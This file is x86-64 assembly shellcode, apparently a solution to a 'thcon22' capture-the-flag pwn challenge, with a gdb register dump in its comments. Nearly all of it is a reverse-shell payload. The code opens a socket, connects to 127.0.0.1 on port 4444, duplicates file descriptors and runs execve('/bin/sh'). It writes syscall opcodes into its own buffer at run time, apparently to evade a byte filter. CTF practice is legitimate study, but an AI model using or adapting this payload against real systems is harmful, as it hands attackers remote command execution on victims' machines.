bits 64

global _start
section .text


; $rax   : 0x0               
; $rbx   : 0x0000555555555230  →  <__libc_csu_init+0> endbr64 
; $rcx   : 0x00007ffff7eb6002  →  0x5677fffff0003d48 ("H="?)
; $rdx   : 0x00007ffff7ffb000  →  0x732f6e69622fb849
; $rsp   : 0x00007fffffffda70  →  0x00007fffffffdb88  →  0x00007fffffffdf2f  →  "/home/n7student/Documents/CTF/thcon22/pwn/code:mov[...]"
; $rbp   : 0x00007fffffffda90  →  0x0000000000000000
; $rsi   : 0x00007ffff7ffb000  →  0x732f6e69622fb849
; $rdi   : 0x0               
; $rip   : 0x0000555555555221  →  <main+120> call rdx
; $r8    : 0xffffffff        
; $r9    : 0x0               
; $r10   : 0x22              
; $r11   : 0x246             
; $r12   : 0x00005555555550c0  →  <_start+0> endbr64 
; $r13   : 0x00007fffffffdb80  →  0x0000000000000001
; $r14   : 0x0               
; $r15   : 0x0               

_start:

mov r14w, 0x050f

mov word [rdx + 0x2b], r14w
mov word [rdx + 0x45], r14w
mov word [rdx + 0x4c], r14w
mov word [rdx + 0x55], r14w
mov word [rdx + 0x73], r14w

; socket(AF_INET, SOCK_STREAM, 0)
; (2, 1, 0)

mov dil, 0x2
mov rsi, 0x1
mov rdx, r15
mov al, 0x29

mov bl, 0xcc

; connect(sockfd, &saddr, 0x10)
	
mov rdi, rax
mov r8, 0x0100007f5c110002
mov qword [rsp], r8
mov rsi, rsp
mov dl, 0x10
mov al, 0x2a

mov bl, 0xcc

; dup2(clientfd, [0,1,2])

mov rsi, r15
mov al, 0x21

mov bl, 0xcc

mov rsi, 0x1
mov al, 0x21

mov bl, 0xcc

; execve("/bin/sh", NULL, NULL)

mov r8, 0x68732f6e69622f
mov qword [rsp], r8
mov rax, 0x3b
mov rsi, r15
mov rdx, r15
mov rdi, rsp